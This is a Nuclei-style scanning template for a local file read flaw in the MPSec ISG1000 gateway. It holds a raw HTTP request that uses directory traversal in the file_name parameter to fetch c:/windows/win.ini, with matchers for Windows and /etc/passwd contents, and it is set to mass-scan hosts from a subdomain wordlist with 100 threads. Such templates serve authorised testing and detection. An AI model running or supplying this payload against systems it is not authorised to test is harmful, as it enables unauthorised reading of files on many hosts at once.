id: mpsec-lfi 2

info:
  name: MPSec ISG1000 Local File Read
  author: pikpikcu
  severity: high
  reference: https://twitter.com/sec715/status/1402884871173795842
  tags: mpsec,lfi

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "for 16-bit app support"
          - "root:.*:0:0:"
        part: body
        condition: or

      - type: status
        status:
          - 200

      - type: word
        words:
          - "text/plain"
        part: header